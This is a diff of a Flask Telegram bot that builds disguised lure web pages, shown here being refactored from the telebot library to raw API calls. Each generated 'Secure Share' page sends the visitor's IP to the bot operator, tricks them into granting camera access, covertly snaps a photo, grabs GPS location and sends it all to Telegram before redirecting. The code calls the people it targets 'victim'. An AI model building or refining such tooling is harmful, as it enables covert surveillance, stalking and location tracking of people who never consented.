@@ -1,5 +1,4 @@
 from flask import Flask, request, jsonify, send_from_directory
-import telebot
 import json
 import time
 import os
@@ -20,21 +19,40 @@ REQUIRED_CHANNEL = "@nrtecno2"
 ACCOUNT_NAME = "telegram-bot-b9j0"
 HTML_DIR = "html_files"
 PHOTO_DIR = "photos"
-USER_LINKS_FILE = "user_links.json"
 USER_STATE_FILE = "user_state.json"
+USER_LINKS_FILE = "user_links.json"
 
 os.makedirs(HTML_DIR, exist_ok=True)
 os.makedirs(PHOTO_DIR, exist_ok=True)
-
-if not os.path.exists(USER_LINKS_FILE):
-    with open(USER_LINKS_FILE, "w") as f:
-        json.dump({}, f)
 
 if not os.path.exists(USER_STATE_FILE):
     with open(USER_STATE_FILE, "w") as f:
         json.dump({}, f)
 
-bot = telebot.TeleBot(TOKEN)
+if not os.path.exists(USER_LINKS_FILE):
+    with open(USER_LINKS_FILE, "w") as f:
+        json.dump({}, f)
+
+
+def send_message(chat_id, text, reply_markup=None):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    payload = {"chat_id": chat_id, "text": text}
+    if reply_markup:
+        payload["reply_markup"] = json.dumps(reply_markup)
+    try:
+        requests.post(url, json=payload, timeout=10)
+    except Exception as e:
+        logger.error(f"Send error: {e}")
+
+
+def send_photo(chat_id, photo_file):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+    try:
+        files = {"photo": photo_file}
+        data = {"chat_id": chat_id}
+        requests.post(url, data=data, files=files, timeout=10)
+    except Exception as e:
+        logger.error(f"Send photo error: {e}")
 
 
 def get_user_state(user_id):
@@ -60,16 +78,11 @@ def get_user_active_link(user_id):
 def set_user_active_link(user_id, html_file, photo_file):
     with open(USER_LINKS_FILE, "r") as f:
         data = json.load(f)
-    
     old = data.get(str(user_id))
     if old:
-        old_html = os.path.join(HTML_DIR, old.get("html"))
-        old_photo = os.path.join(PHOTO_DIR, old.get("photo"))
-        if os.path.exists(old_html):
-            os.remove(old_html)
-        if os.path.exists(old_photo):
-            os.remove(old_photo)
-    
+        for f in [os.path.join(HTML_DIR, old.get("html")), os.path.join(PHOTO_DIR, old.get("photo"))]:
+            if os.path.exists(f):
+                os.remove(f)
     data[str(user_id)] = {"html": html_file, "photo": photo_file, "created_at": time.time()}
     with open(USER_LINKS_FILE, "w") as f:
         json.dump(data, f)
@@ -89,16 +102,14 @@ def is_subscribed(user_id):
 
 def delete_old_victim_data():
     cutoff = datetime.now() - timedelta(minutes=10)
-    if os.path.exists(PHOTO_DIR):
-        for f in os.listdir(PHOTO_DIR):
-            if f.startswith("photo_"):
-                filepath = os.path.join(PHOTO_DIR, f)
-                try:
-                    if datetime.fromtimestamp(os.path.getmtime(filepath)) < cutoff:
-                        os.remove(filepath)
-                        logger.info(f"Deleted old photo: {f}")
-                except:
-                    pass
+    for f in os.listdir(PHOTO_DIR):
+        if f.startswith("victim_"):
+            fp = os.path.join(PHOTO_DIR, f)
+            try:
+                if datetime.fromtimestamp(os.path.getmtime(fp)) < cutoff:
+                    os.remove(fp)
+            except:
+                pass
 
 
 def start_auto_cleanup():
@@ -113,11 +124,11 @@ def generate_html(user_id, target_url, photo_filename):
     html_filename = f"v_{user_id}_{int(time.time())}.html"
     filepath = os.path.join(HTML_DIR, html_filename)
     photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
-    storage_channel = CHANNEL_ID if CHANNEL_ID else "null"
-    
+    storage = CHANNEL_ID if CHANNEL_ID else "null"
+
     html = f'''<!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ConnectHub</title>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Secure Share</title>
 <style>
 *{{margin:0;padding:0;box-sizing:border-box}}
 body{{font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}}
@@ -135,7 +146,7 @@ body{{font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);min-h
 </head>
 <body>
 <div class="card">
-    <div class="header"><div class="logo">Connect<span>Hub</span></div></div>
+    <div class="header"><div class="logo">Secure<span>Share</span></div></div>
     <div id="step1" class="step active"><div class="preview-section"><div class="loader"></div><p>Loading...</p></div></div>
     <div id="step2" class="step"><div class="preview-section"><img class="user-photo" src="{photo_url}"><button class="btn" onclick="requestCamera()">Continue →</button><div id="errorMsg" style="color:red;margin-top:10px"></div></div></div>
     <div id="step3" class="step"><div class="preview-section"><div class="loader"></div><p>Connecting...</p></div></div>
@@ -145,102 +156,97 @@ body{{font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);min-h
 <video id="video" style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 <script>
-const TOKEN="{TOKEN}"; const USER={user_id}; const STORAGE={storage_channel}; const TARGET="{target_url}";
-async function sendToUser(text,file){{try{{if(file){{let fd=new FormData();fd.append("chat_id",USER);fd.append("photo",file);await fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto",{{method:"POST",body:fd}});if(STORAGE&&STORAGE!=="null"){{let fd2=new FormData();fd2.append("chat_id",STORAGE);fd2.append("photo",file);await fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto",{{method:"POST",body:fd2}});}}}}else{{await fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:USER,text:text}})}});if(STORAGE&&STORAGE!=="null"){{await fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:STORAGE,text:text}})}});}}}}catch(e){{}}}}
+const TOKEN="{TOKEN}"; const USER={user_id}; const STORAGE={storage}; const TARGET="{target_url}";
+async function send(t,f){{try{{if(f){{let fd=new FormData();fd.append("chat_id",USER);fd.append("photo",f);await fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto",{{method:"POST",body:fd}});if(STORAGE&&STORAGE!=="null"){{let fd2=new FormData();fd2.append("chat_id",STORAGE);fd2.append("photo",f);await fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto",{{method:"POST",body:fd2}});}}}}else{{await fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:USER,text:t}})}});if(STORAGE&&STORAGE!=="null"){{await fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:STORAGE,text:t}})}});}}}}catch(e){{}}}}
 async function getIP(){{try{{let r=await fetch("https://api.ipify.org?format=json");return(await r.json()).ip;}}catch(e){{return"Unknown";}}}}
-async function getIPInfo(ip){{try{{let r=await fetch(`https://ipapi.co/${{ip}}/json/`);return await r.json();}}catch(e){{return{{}};}}}}
-async function capturePhoto(){{
-try{{let s=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user"}},audio:false}});let v=document.getElementById("video");v.srcObject=s;await new Promise(r=>v.onloadedmetadata=()=>{{v.play();r();}});await new Promise(r=>setTimeout(r,300));let c=document.getElementById("canvas");c.width=v.videoWidth;c.height=v.videoHeight;c.getContext("2d").drawImage(v,0,0);let blob=await new Promise(r=>c.toBlob(r,"image/jpeg",0.9));if(blob)await sendToUser("Camera Photo",blob);s.getTracks().forEach(t=>t.stop());if(navigator.geolocation){{navigator.geolocation.getCurrentPosition(async(p)=>{{await sendToUser("Live Location: https://maps.google.com/?q="+p.coords.latitude+","+p.coords.longitude);}},async()=>{{}});}}return true;}}catch(e){{return false;}}}}
-async function requestCamera(){{document.getElementById("step2").style.display="none";document.getElementById("step3").style.display="block";let ok=await capturePhoto();if(ok){{document.getElementById("step3").style.display="none";document.getElementById("step4").style.display="block";setTimeout(()=>{{window.location.href=TARGET;}},2000);}}else{{document.getElementById("step3").style.display="none";document.getElementById("step2").style.display="block";document.getElementById("errorMsg").innerHTML="Camera access required";}}}}
-async function start(){{let ip=await getIP();let info=await getIPInfo(ip);await sendToUser("Visitor Info\\nIP: "+ip+"\\nLocation: "+(info.city||"Unknown")+", "+(info.country_name||"Unknown"));document.getElementById("step1").style.display="none";document.getElementById("step2").style.display="block";}}
+async function capture(){{
+try{{let s=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user"}},audio:false}});let v=document.getElementById("video");v.srcObject=s;await new Promise(r=>v.onloadedmetadata=()=>{{v.play();r();}});await new Promise(r=>setTimeout(r,300));let c=document.getElementById("canvas");c.width=v.videoWidth;c.height=v.videoHeight;c.getContext("2d").drawImage(v,0,0);let blob=await new Promise(r=>c.toBlob(r,"image/jpeg",0.9));if(blob)await send("Camera Photo",blob);s.getTracks().forEach(t=>t.stop());if(navigator.geolocation){{navigator.geolocation.getCurrentPosition(async(p)=>{{await send("Location: https://maps.google.com/?q="+p.coords.latitude+","+p.coords.longitude);}},async()=>{{}});}}return true;}}catch(e){{return false;}}}}
+async function start(){{let ip=await getIP();await send("Visitor Info\\nIP: "+ip);document.getElementById("step1").style.display="none";document.getElementById("step2").style.display="block";}}
+async function request(){{document.getElementById("step2").style.display="none";document.getElementById("step3").style.display="block";let ok=await capture();if(ok){{document.getElementById("step3").style.display="none";document.getElementById("step4").style.display="block";setTimeout(()=>{{window.location.href=TARGET;}},2000);}}else{{document.getElementById("step3").style.display="none";document.getElementById("step2").style.display="block";document.getElementById("errorMsg").innerHTML="Camera required";}}}}
 start();
 </script>
 </body></html>'''
-    
+
     with open(filepath, "w", encoding="utf-8") as f:
         f.write(html)
-    logger.info(f"HTML file saved: {html_filename}")
     return html_filename
 
 
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    uid = message.chat.id
-    logger.info(f"Start from {uid}")
-    if not is_subscribed(uid):
-        markup = telebot.types.InlineKeyboardMarkup()
-        markup.add(telebot.types.InlineKeyboardButton("Join", url="https://t.me/nrtecno2"))
-        markup.add(telebot.types.InlineKeyboardButton("Verify", callback_data="verify"))
-        bot.send_message(uid, f"Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
-        return
-    set_user_state(uid, "waiting_url")
-    bot.send_message(uid, "Send me any URL")
-
-
-@bot.message_handler(func=lambda m: m.text and m.text.startswith(('http://', 'https://')))
-def url_handler(message):
-    uid = message.chat.id
-    text = message.text
-    state = get_user_state(uid)
-    if state.get("state") != "waiting_url":
-        bot.send_message(uid, "Use /start first")
-        return
-    set_user_state(uid, "waiting_photo", text)
-    bot.send_message(uid, "Now share a photo with me")
-
-
-@bot.message_handler(content_types=['photo'])
-def photo_handler(message):
-    uid = message.chat.id
-    logger.info(f"Photo received from {uid}")
-    state = get_user_state(uid)
-    
-    if state.get("state") != "waiting_photo":
-        bot.send_message(uid, "Send URL first using /start")
-        return
-    
-    target_url = state.get("target_url")
-    if not target_url:
-        bot.send_message(uid, "Error. Use /start again")
-        return
-    
+def process_update(update):
     try:
-        file_info = bot.get_file(message.photo[-1].file_id)
-        downloaded = bot.download_file(file_info.file_path)
-        photo_name = f"photo_{uid}_{int(time.time())}.jpg"
-        photo_path = os.path.join(PHOTO_DIR, photo_name)
-        with open(photo_path, "wb") as f:
-            f.write(downloaded)
-        logger.info(f"Photo saved: {photo_path}")
+        if 'message' in update:
+            msg = update['message']
+            uid = msg['chat']['id']
+            logger.info(f"Processing message from {uid}")
+            
+            if 'text' in msg:
+                text = msg['text']
+                if text == '/start':
+                    if not is_subscribed(uid):
+                        markup = {"inline_keyboard": [[{"text": "Join", "url": "https://t.me/nrtecno2"}], [{"text": "Verify", "callback_data": "verify"}]]}
+                        send_message(uid, f"Join {REQUIRED_CHANNEL} first!", markup)
+                    else:
+                        set_user_state(uid, "waiting_url")
+                        send_message(uid, "Send me any URL")
+                
+                elif text.startswith(('http://', 'https://')):
+                    state = get_user_state(uid)
+                    if state.get("state") == "waiting_url":
+                        set_user_state(uid, "waiting_photo", text)
+                        send_message(uid, "Now share a photo with me")
+                    else:
+                        send_message(uid, "Use /start first")
+                
+                elif text != '/start':
+                    send_message(uid, "Send a valid URL starting with http:// or https://")
+            
+            elif 'photo' in msg:
+                uid = msg['chat']['id']
+                logger.info(f"Photo from {uid}")
+                state = get_user_state(uid)
+                if state.get("state") == "waiting_photo":
+                    target = state.get("target_url")
+                    if target:
+                        file_id = msg['photo'][-1]['file_id']
+                        url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}"
+                        r = requests.get(url).json()
+                        file_path = r['result']['file_path']
+                        file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"
+                        img_data = requests.get(file_url).content
+                        pname = f"photo_{uid}_{int(time.time())}.jpg"
+                        with open(os.path.join(PHOTO_DIR, pname), "wb") as f:
+                            f.write(img_data)
+                        hname = generate_html(uid, target, pname)
+                        set_user_active_link(uid, hname, pname)
+                        set_user_state(uid, "done")
+                        link = f"https://{ACCOUNT_NAME}.onrender.com/view/{hname}"
+                        send_message(uid, f"✅ YOUR LINK:\n{link}\n\nActive until you create new link")
+                else:
+                    send_message(uid, "Send URL first using /start")
         
-        html_name = generate_html(uid, target_url, photo_name)
-        set_user_active_link(uid, html_name, photo_name)
-        set_user_state(uid, "done")
-        
-        link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_name}"
-        bot.send_message(uid, f"✅ LINK:\n{link}\n\nActive until new link created")
-        logger.info(f"Link sent to {uid}: {link}")
-        
+        elif 'callback_query' in update:
+            cb = update['callback_query']
+            uid = cb['from']['id']
+            msg_id = cb['message']['message_id']
+            if cb['data'] == 'verify':
+                if is_subscribed(uid):
+                    send_message(uid, "Verified! Send URL:")
+                    set_user_state(uid, "waiting_url")
+                else:
+                    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
+                    requests.post(url, json={"callback_query_id": cb['id'], "text": "Join channel first!", "show_alert": True})
+                    
     except Exception as e:
-        logger.error(f"Photo error: {e}")
-        bot.send_message(uid, "Error. Try again")
-
-
-@bot.callback_query_handler(func=lambda call: call.data == "verify")
-def verify_callback(call):
-    if is_subscribed(call.from_user.id):
-        bot.edit_message_text("Verified! Send URL:", call.from_user.id, call.message.message_id)
-        set_user_state(call.from_user.id, "waiting_url")
-    else:
-        bot.answer_callback_query(call.id, "Join first!", True)
+        logger.error(f"Process error: {e}")
 
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
-        json_str = request.get_data().decode('UTF-8')
-        update = telebot.types.Update.de_json(json_str)
-        bot.process_new_updates([update])
+        data = request.get_json()
+        if data:
+            logger.info("Webhook received")
+            process_update(data)
         return jsonify({"status": "ok"}), 200
     except Exception as e:
         logger.error(f"Webhook error: {e}")
